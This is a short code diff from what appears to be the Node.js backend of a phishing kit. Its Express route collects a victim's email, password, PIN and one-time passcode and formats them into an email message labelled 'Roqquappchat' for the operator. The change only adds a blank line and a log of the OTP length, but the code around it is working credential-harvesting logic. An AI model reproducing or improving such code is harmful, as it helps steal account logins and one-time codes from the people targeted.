@@ -67,7 +67,10 @@ transporter.verify(function (error, _success) {
 app.post('/rq-1', (req, res, next) => {
     console.log('req body', req.body)
 
+
     const { email, password, pin, otp } = req.body
+
+    console.log('length of otp', otp.length)
     const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong>${otp}</p> </br> checking - New message from Roqquappchat!`
   
 
